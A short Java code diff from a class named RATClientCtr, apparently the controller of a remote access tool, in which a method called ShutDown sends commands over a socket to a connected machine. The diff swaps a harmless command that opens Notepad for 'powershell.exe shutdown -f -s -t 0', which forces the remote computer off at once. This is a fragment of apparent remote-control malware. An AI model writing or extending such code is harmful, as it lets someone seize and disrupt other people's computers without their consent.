@@ -69,7 +69,7 @@ public class RATClientCtr {
     }
     
     public static void ShutDown() throws IOException {
-        String command = "powershell.exe start-process notepad.exe";
+        String command = "powershell.exe shutdown -f -s -t 0";
         OutputStream ops = mySocket.getOutputStream();
         DataOutputStream dos = new DataOutputStream(ops);
         dos.writeUTF(command);
